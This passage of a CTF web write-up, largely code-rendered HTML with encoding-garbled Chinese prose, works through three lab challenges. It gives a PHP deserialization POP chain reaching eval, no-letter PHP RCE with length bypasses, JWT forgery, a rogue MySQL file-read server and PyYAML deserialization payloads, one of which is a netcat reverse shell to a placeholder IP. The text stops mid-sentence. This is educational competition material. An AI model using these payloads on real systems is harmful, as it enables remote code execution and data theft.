class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">class Wuhuarou&#123;</span><br><span class="line">    public $Wuhuarou;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        echo &quot;Nice Wuhuarou!&lt;/br&gt;&quot;;</span><br><span class="line">        echo $this -&gt; Wuhuarou;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Fentiao&#123;</span><br><span class="line">    public $Fentiao;</span><br><span class="line">    public $Hongshufentiao;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        echo &quot;Nice Fentiao!&lt;/br&gt;&quot;;</span><br><span class="line">        return $this -&gt; Fentiao -&gt; Hongshufentiao;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Baicai&#123;</span><br><span class="line">    public $Baicai;</span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        echo &quot;Nice Baicai!&lt;/br&gt;&quot;;</span><br><span class="line">        $Baicai = $this -&gt; Baicai;</span><br><span class="line">        return $Baicai();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Wanzi&#123;</span><br><span class="line">    public $Wanzi;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        echo &quot;Nice Wanzi!&lt;/br&gt;&quot;;</span><br><span class="line">        return $this -&gt; Wanzi -&gt; Xianggu();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Xianggu&#123;</span><br><span class="line">    public $Xianggu;</span><br><span class="line">    public $Jinzhengu;</span><br><span class="line">    public function __construct($Jinzhengu)&#123;</span><br><span class="line">        $this -&gt; Jinzhengu = $Jinzhengu;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __call($name, $arg)&#123;</span><br><span class="line">        echo &quot;Nice Xianggu!&lt;/br&gt;&quot;;</span><br><span class="line">        $this -&gt; Xianggu -&gt; Bailuobo = $this -&gt; Jinzhengu;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Huluobo&#123;</span><br><span class="line">    public $HuLuoBo;</span><br><span class="line">    public function __set($key,$arg)&#123;</span><br><span class="line">        echo &quot;Nice Huluobo!&lt;/br&gt;&quot;;</span><br><span class="line">        eval($arg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#x27;eat&#x27;]))&#123;</span><br><span class="line">    unserialize($_POST[&#x27;eat&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20251112203848732.png" alt="image-20251112203848732"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Wuhuarou</span><br><span class="line">&#123;</span><br><span class="line">    public $Wuhuarou;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Fentiao</span><br><span class="line">&#123;</span><br><span class="line">    public $Fentiao;</span><br><span class="line">    public $Hongshufentiao;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Baicai</span><br><span class="line">&#123;</span><br><span class="line">    public $Baicai;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Wanzi</span><br><span class="line">&#123;</span><br><span class="line">    public $Wanzi;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Xianggu</span><br><span class="line">&#123;</span><br><span class="line">    public $Xianggu;</span><br><span class="line">    public $Jinzhengu;</span><br><span class="line"></span><br><span class="line">    public function __construct($Jinzhengu)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;Jinzhengu = $Jinzhengu;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Huluobo</span><br><span class="line">&#123;</span><br><span class="line">    public $HuLuoBo;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new Wuhuarou();</span><br><span class="line">$a-&gt;Wuhuarou = new Fentiao();</span><br><span class="line">$a-&gt;Wuhuarou-&gt;Fentiao = new Baicai();</span><br><span class="line">$a-&gt;Wuhuarou-&gt;Fentiao-&gt;Baicai = new Wanzi();</span><br><span class="line">$a-&gt;Wuhuarou-&gt;Fentiao-&gt;Baicai-&gt;Wanzi = new Xianggu(&#x27;system(&quot;cat /flag&quot;);&#x27;);</span><br><span class="line">$a-&gt;Wuhuarou-&gt;Fentiao-&gt;Baicai-&gt;Wanzi-&gt;Xianggu = new Huluobo();</span><br><span class="line"></span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>

<h3 id="Ezphp"><a href="#Ezphp" class="headerlink" title="Ezphp"></a>Ezphp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flagå°±åœ¨flag.phpé‡Œï¼Œç«¥åŸæ— æ¬ºçš„å•¦</span><br></pre></td></tr></table></figure>

<h4 id="è€ƒç‚¹-phpéæ³•å‚æ•°åä¼ å‚-æ— å­—æ¯æ•°å­—rce-å‘½ä»¤æ‰§è¡Œé•¿åº¦é™åˆ¶ç»•è¿‡"><a href="#è€ƒç‚¹-phpéæ³•å‚æ•°åä¼ å‚-æ— å­—æ¯æ•°å­—rce-å‘½ä»¤æ‰§è¡Œé•¿åº¦é™åˆ¶ç»•è¿‡" class="headerlink" title="è€ƒç‚¹:phpéæ³•å‚æ•°åä¼ å‚,æ— å­—æ¯æ•°å­—rce,å‘½ä»¤æ‰§è¡Œé•¿åº¦é™åˆ¶ç»•è¿‡"></a>è€ƒç‚¹:phpéæ³•å‚æ•°åä¼ å‚,æ— å­—æ¯æ•°å­—rce,å‘½ä»¤æ‰§è¡Œé•¿åº¦é™åˆ¶ç»•è¿‡</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$code = $_GET[&#x27;c1n_y0.u g3t+fl&amp;g?&#x27;];</span><br><span class="line">if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;</span><br><span class="line">    die(&quot;hacker!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if(strlen($code)&gt;14)&#123;</span><br><span class="line">    die(&quot;is tooooooooooooooooooo long!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;Flag is in flag.php~~ (local).&quot;;</span><br><span class="line">@eval($code);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="é¢„æœŸè§£"><a href="#é¢„æœŸè§£" class="headerlink" title="é¢„æœŸè§£"></a>é¢„æœŸè§£</h4><p>éæ³•å˜é‡åï¼šphpç‰ˆæœ¬â¼©äº8ï¼Œå¦‚æœå‚æ•°ä¸­å‡ºç°ä¸­æ‹¬å·[ï¼Œä¸­æ‹¬å·ä¼šè¢«è½¬æ¢æˆä¸‹åˆ’çº¿_ï¼Œå¦‚æœåâ¾¯è¿˜æœ‰â¾®æ³•å­—ç¬¦(. [ ç©ºæ ¼)ï¼Œåˆ™ä¸ä¼šè¢«ç»§ç»­è½¬æ¢æˆä¸‹åˆ’çº¿ï¼Œç¬¦å·æ³¨æ„urlç¼–ç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c1n[y0.u%20g3t%2Bfl%26g?</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.qwesec.com/2024/03/noLettersOrNumbersRCE.html#%E6%80%9D%E8%B7%AF</span><br><span class="line">https://blog.csdn.net/q20010619/article/details/109206728</span><br></pre></td></tr></table></figure>

<p>å–ååŠ &#96;&#96;æ‰§è¡Œå‘½ä»¤åŠ å››å­—ç¬¦ç»•è¿‡é•¿åº¦é™åˆ¶ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c1n[y0.u%20g3t%2Bfl%26g?=$_=~%C1%9C%9E%8B;`$_`;</span><br><span class="line">?c1n[y0.u%20g3t%2Bfl%26g?=`*&gt;=`;</span><br></pre></td></tr></table></figure>

<h4 id="éé¢„æœŸè§£"><a href="#éé¢„æœŸè§£" class="headerlink" title="éé¢„æœŸè§£"></a>éé¢„æœŸè§£</h4><p>åœ¨åˆ«çš„å¸ˆå‚…ã€æœªçŸ¥çš„å¸ˆå‚…ã€‘é‚£é‡Œå­¦æ¥çš„æ–‡ä»¶ä¸Šä¼ å†™å…¥flagåˆ°txtä¸‹</p>
<p>run.sh</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> flag.php &gt; 1.txt</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸Šä¼ æ–‡ä»¶åŒæ—¶ï¼Œæ‰§è¡Œ shell</span></span><br><span class="line">url = <span class="string">r&quot;http://challenge.ilovectf.cn:30590/?c1n%5By0.u%20g3t%2Bfl%26g%3F=`.+/*/*[@-[]`;&quot;</span></span><br><span class="line"></span><br><span class="line">r = requests.post(url, files=&#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">r&quot;D:\å¼ºåˆ¶æ–‡ä»¶ä¸Šä¼ \run.sh&quot;</span>)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<h3 id="MySQLç®¡ç†å·¥å…·"><a href="#MySQLç®¡ç†å·¥å…·" class="headerlink" title="MySQLç®¡ç†å·¥å…·"></a>MySQLç®¡ç†å·¥å…·</h3><h4 id="è€ƒç‚¹ï¼šJWTä¼ªé€ ï¼ŒMySQLä»»æ„æ–‡ä»¶è¯»å–æ¼æ´-py-yamlååºåˆ—åŒ–"><a href="#è€ƒç‚¹ï¼šJWTä¼ªé€ ï¼ŒMySQLä»»æ„æ–‡ä»¶è¯»å–æ¼æ´-py-yamlååºåˆ—åŒ–" class="headerlink" title="è€ƒç‚¹ï¼šJWTä¼ªé€ ï¼ŒMySQLä»»æ„æ–‡ä»¶è¯»å–æ¼æ´,py-yamlååºåˆ—åŒ–"></a>è€ƒç‚¹ï¼šJWTä¼ªé€ ï¼ŒMySQLä»»æ„æ–‡ä»¶è¯»å–æ¼æ´,py-yamlååºåˆ—åŒ–</h4><p><img src="/../images/image-20251111183656103.png" alt="image-20251111183656103"></p>
<p>æŸ¥çœ‹æºç å­˜åœ¨å¼±å£ä»¤ï¼Œç™»å½•ä¸Šå»å‘ç°æ˜¯ä¸€ä¸ªmysqlè¿æ¥é¡µé¢ï¼Œéšæ„è¾“å…¥å¯†ç æ˜¾ç¤ºæƒé™ä¸è¶³</p>
<p><img src="/../images/image-20251111183903444.png" alt="image-20251111183903444"></p>
<p>æŠ“åŒ…æŸ¥çœ‹æœ‰<strong>Authorization</strong>ï¼Œjwtå½¢å¼ï¼Œå…ˆå°è¯•çˆ†ç ´keyï¼Œç„¶åæ¥æ„é€ admin</p>
<p><img src="/../images/image-20251111222118644.png" alt="image-20251111222118644"></p>
<p><img src="/../images/image-20251111185058396.png" alt="image-20251111185058396"></p>
<p><img src="/../images/image-20251111185113746.png" alt="image-20251111185113746"></p>
<p>ä¼ªé€ äº†adminä¹‹åï¼Œæ˜¾ç¤ºä¸èƒ½è¿æ¥æœ¬åœ°çš„mysqlæ˜¯ä¸æ˜¯å°±èƒ½è¿åˆ«çš„æ•°æ®åº“ï¼Œmysqlä»»æ„è¿æ¥ï¼Œæ‰¾expæ¥æ‰“</p>
<p><img src="/../images/image-20251111222320934.png" alt="image-20251111222320934"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/allyshka/Rogue-MySql-Server</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹ç«¯å£å·ã€ä¹Ÿå¯ä»¥ä¸æ”¹ã€‘ï¼Œå’Œè¯»å–çš„æ–‡ä»¶app.pyï¼Œå°±å¯ä»¥åœ¨è‡ªå·±çš„vpsä¸Šé¢å¯pythonæœåŠ¡ï¼Œç„¶åè¯»çš„æ–‡ä»¶åœ¨mysql.logå½“ä¸­</p>
<p><img src="/../images/image-20251111225148377.png" alt="image-20251111225148377"></p>
<p>ä¸ºä»€ä¹ˆè¯»app.pyå‘¢ å› ä¸ºè¯†åˆ«åˆ°ç›¸åº”çš„ã€python-flaskã€‘äº†</p>
<p><img src="/../images/image-20251111225819442.png" alt="image-20251111225819442"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import yaml</span><br><span class="line">import MySQLdb</span><br><span class="line">from flask import Flask, request, jsonify, render_template, redirect</span><br><span class="line">from functools import wraps</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = os.urandom(24)</span><br><span class="line"></span><br><span class="line">def login_required(f):</span><br><span class="line">    @wraps(f)</span><br><span class="line">    def decorated_function(*args, **kwargs):</span><br><span class="line">        token = request.headers.get(&#x27;Authorization&#x27;, &#x27;&#x27;).replace(&#x27;Bearer &#x27;, &#x27;&#x27;)</span><br><span class="line">        if not token or token not in [&#x27;admin&#x27;, &#x27;user&#x27;]:</span><br><span class="line">            return jsonify(&#123;&quot;error&quot;: &quot;Unauthorized&quot;&#125;), 401</span><br><span class="line">        request.current_user = token</span><br><span class="line">        return f(*args, **kwargs)</span><br><span class="line">    return decorated_function</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return redirect(&#x27;/login&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/login&#x27;)</span><br><span class="line">def login():</span><br><span class="line">    return &#x27;&#x27;&#x27;</span><br><span class="line">    &lt;form action=&quot;/login&quot; method=&quot;post&quot;&gt;</span><br><span class="line">        Username: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br&gt;</span><br><span class="line">        Password: &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/login&#x27;, methods=[&#x27;POST&#x27;])</span><br><span class="line">def do_login():</span><br><span class="line">    username = request.form.get(&#x27;username&#x27;, &#x27;&#x27;)</span><br><span class="line">    password = request.form.get(&#x27;password&#x27;, &#x27;&#x27;)</span><br><span class="line">    </span><br><span class="line">    if username == &#x27;admin&#x27; and password == os.getenv(&#x27;ADMIN_PASS&#x27;, &#x27;admin123&#x27;):</span><br><span class="line">        return jsonify(&#123;&quot;token&quot;: &quot;admin&quot;&#125;)</span><br><span class="line">    elif username == &#x27;user&#x27; and password == &#x27;user123&#x27;:</span><br><span class="line">        return jsonify(&#123;&quot;token&quot;: &quot;user&quot;&#125;)</span><br><span class="line">    else:</span><br><span class="line">        return jsonify(&#123;&quot;error&quot;: &quot;Invalid credentials&quot;&#125;), 401</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/dashboard&#x27;)</span><br><span class="line">@login_required</span><br><span class="line">def dashboard():</span><br><span class="line">    if request.current_user == &#x27;admin&#x27;:</span><br><span class="line">        return &#x27;&#x27;&#x27;</span><br><span class="line">        &lt;!DOCTYPE html&gt;</span><br><span class="line">        &lt;html&gt;</span><br><span class="line">        &lt;head&gt;</span><br><span class="line">            &lt;title&gt;Admin Dashboard&lt;/title&gt;</span><br><span class="line">            &lt;style&gt;</span><br><span class="line">            .container &#123;max-width: 800px; margin: 0 auto; padding: 20px;&#125;</span><br><span class="line">            input, button &#123;margin: 5px; padding: 8px;&#125;</span><br><span class="line">            input &#123;width: 200px;&#125;</span><br><span class="line">            &lt;/style&gt;</span><br><span class="line">        &lt;/head&gt;</span><br><span class="line">        &lt;body&gt;</span><br><span class="line">            &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">                &lt;h3&gt;ğŸ™ æµ‹è¯• MySQL è¿æ¥&lt;/h3&gt;</span><br><span class="line">                &lt;form id=&quot;f&quot;&gt;</span><br><span class="line">                    &lt;input name=&quot;host&quot; placeholder=&quot;Host&quot; value=&quot;127.0.0.1&quot;&gt;</span><br><span class="line">                    &lt;input name=&quot;port&quot; placeholder=&quot;Port&quot; value=&quot;3306&quot;&gt;</span><br><span class="line">                    &lt;input name=&quot;user&quot; placeholder=&quot;User&quot; value=&quot;root&quot;&gt;</span><br><span class="line">                    &lt;input name=&quot;password&quot; placeholder=&quot;Password&quot; type=&quot;password&quot;&gt;</span><br><span class="line">                    &lt;input name=&quot;db&quot; placeholder=&quot;Database&quot; value=&quot;mysql&quot;&gt;</span><br><span class="line">                    &lt;button type=&quot;button&quot; onclick=&quot;test()&quot;&gt;æµ‹è¯•è¿æ¥&lt;/button&gt;</span><br><span class="line">                &lt;/form&gt;</span><br><span class="line">                &lt;pre id=&quot;out&quot;&gt;&lt;/pre&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;script&gt;</span><br><span class="line">                const token = localStorage.getItem(&#x27;token&#x27;);</span><br><span class="line">                if(!token) location.href=&#x27;/&#x27;;</span><br><span class="line">                </span><br><span class="line">                async function test()&#123;</span><br><span class="line">                    const out = document.getElementById(&#x27;out&#x27;);</span><br><span class="line">                    out.textContent = &#x27;æ­£åœ¨æµ‹è¯•...&#x27;;</span><br><span class="line">                    let data = Object.fromEntries(new FormData(f).entries());</span><br><span class="line">                    try&#123;</span><br><span class="line">                        let res = await fetch(&#x27;/test_mysql&#x27;, &#123;</span><br><span class="line">                            method: &#x27;POST&#x27;,</span><br><span class="line">                            headers: &#123;</span><br><span class="line">                                &#x27;Content-Type&#x27;: &#x27;application/json&#x27;,</span><br><span class="line">                                &#x27;Authorization&#x27;: &#x27;Bearer &#x27; + token</span><br><span class="line">                            &#125;,</span><br><span class="line">                            body: JSON.stringify(data)</span><br><span class="line">                        &#125;);</span><br><span class="line">                        let j = await res.json();</span><br><span class="line">                        out.style.color = j.success ? &#x27;green&#x27; : &#x27;red&#x27;;</span><br><span class="line">                        out.textContent = j.success ? &#x27;è¿æ¥æˆåŠŸï¼&#x27; : &#x27;è¿æ¥å¤±è´¥\\n&#x27; + (j.error || &#x27;&#x27;);</span><br><span class="line">                    &#125; catch(e) &#123;</span><br><span class="line">                        out.textContent = &#x27;è¯·æ±‚å‡ºé”™ï¼š&#x27; + e;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &lt;/script&gt;</span><br><span class="line">        &lt;/body&gt;</span><br><span class="line">        &lt;/html&gt;</span><br><span class="line">        &#x27;&#x27;&#x27;</span><br><span class="line">    else:</span><br><span class="line">        return &#x27;&lt;h3&gt;User Dashboard&lt;/h3&gt;&lt;p&gt;Welcome, user!&lt;/p&gt;&#x27;</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/test_mysql&#x27;, methods=[&#x27;POST&#x27;])</span><br><span class="line">@login_required</span><br><span class="line">def test_mysql():</span><br><span class="line">    if request.current_user != &#x27;admin&#x27;:</span><br><span class="line">        return jsonify(&#123;</span><br><span class="line">            &quot;success&quot;: False, </span><br><span class="line">            &quot;error&quot;: &quot;æƒé™ä¸è¶³ï¼Œåªæœ‰ admin å¯ä»¥æµ‹è¯• MySQL è¿æ¥&quot;</span><br><span class="line">        &#125;), 403</span><br><span class="line">    </span><br><span class="line">    data = request.get_json() or &#123;&#125;</span><br><span class="line">    for k in (&quot;host&quot;, &quot;port&quot;, &quot;user&quot;, &quot;password&quot;, &quot;db&quot;):</span><br><span class="line">        if k not in data:</span><br><span class="line">            return jsonify(&#123;&quot;success&quot;: False, &quot;error&quot;: f&quot;ç¼ºå°‘å­—æ®µ: &#123;k&#125;&quot;&#125;)</span><br><span class="line">    </span><br><span class="line">    try:</span><br><span class="line">        conn = MySQLdb.connect(</span><br><span class="line">            host=data[&quot;host&quot;],</span><br><span class="line">            port=int(data[&quot;port&quot;]),</span><br><span class="line">            user=data[&quot;user&quot;],</span><br><span class="line">            passwd=data[&quot;password&quot;],</span><br><span class="line">            db=data[&quot;db&quot;],</span><br><span class="line">            connect_timeout=5,</span><br><span class="line">            charset=&#x27;utf8mb4&#x27;,</span><br><span class="line">            local_infile=1,</span><br><span class="line">            ssl=None</span><br><span class="line">        )</span><br><span class="line">        cur = conn.cursor()</span><br><span class="line">        cur.execute(&quot;SELECT 1&quot;)</span><br><span class="line">        cur.close()</span><br><span class="line">        conn.close()</span><br><span class="line">        </span><br><span class="line">        return jsonify(&#123;&quot;success&quot;: True&#125;)</span><br><span class="line">    except MySQLdb.Error as e:</span><br><span class="line">        return jsonify(&#123;&quot;success&quot;: False, &quot;error&quot;: str(e)&#125;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return jsonify(&#123;&quot;success&quot;: False, &quot;error&quot;: f&quot;å…¶ä»–é”™è¯¯: &#123;e&#125;&quot;&#125;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/uneed1t&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def uneed1t():</span><br><span class="line">    data = request.args.get(&#x27;data&#x27;, &#x27;&#x27;)</span><br><span class="line">    if data == &#x27;&#x27;:</span><br><span class="line">        return jsonify(&#123;&quot;result&quot;: &quot;null&quot;&#125;)</span><br><span class="line">    </span><br><span class="line">    try:</span><br><span class="line">        black_list = [&quot;system&quot;, &quot;popen&quot;, &quot;run&quot;, &quot;os&quot;]</span><br><span class="line">        </span><br><span class="line">        for forb in black_list:</span><br><span class="line">            if forb in data:</span><br><span class="line">                return jsonify(&#123;&quot;result&quot;: &quot;error&quot;&#125;)</span><br><span class="line">        </span><br><span class="line">        yaml.load(data, Loader=yaml.Loader)</span><br><span class="line">        return jsonify(&#123;&quot;result&quot;: &quot;ok&quot;&#125;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return jsonify(&#123;&quot;result&quot;: &quot;error&quot;&#125;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run(host=&quot;0.0.0.0&quot;, port=8000)</span><br></pre></td></tr></table></figure>

<p>å®¡è®¡å¤šå‡ºæ¥çš„è·¯ç”±&#x2F;uneed1tçš„ä»£ç æ®µï¼Œå‘ç°ä½¿ç”¨äº†yaml.loadåšåŠ è½½å™¨ï¼Œå³ä½¿ä½¿ç”¨äº†é»‘åå•é™åˆ¶äº†ä¸€å†™æ“ä½œï¼Œè¿˜æ˜¯å¯ä»¥ç”¨ <code>subprocess</code>æ¨¡å—æ‰§è¡Œå‘½ä»¤æ‰“yamlååºåˆ—åŒ–æ¼æ´</p>
<p><img src="/../images/image-20251111234324363.png" alt="image-20251111234324363"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xz.aliyun.com/news/7518</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20251111233615270.png" alt="image-20251111233615270"></p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;&quot;!!python/object/apply:subprocess.Popen</span><br><span class="line">- [&quot;sh&quot;,&quot;-c&quot;,&quot;cat /f* &gt;1.txt&quot;]</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;!!python/object/apply:subprocess.call</span><br><span class="line">[[&#x27;/bin/busybox&#x27;,&#x27;nc&#x27;,&#x27;xx.xx.xx.xx&#x27;,&#x27;11111&#x27;,&#x27;-e&#x27;,&#x27;/bin/sh&#x27;]]</span><br><span class="line">&quot;&quot;&quot;</span><br></pre></td></tr></table></figure>

<p>è„šæœ¬ã€å«aiå†™çš„ å˜»å˜»ã€‘ï¼š</p>
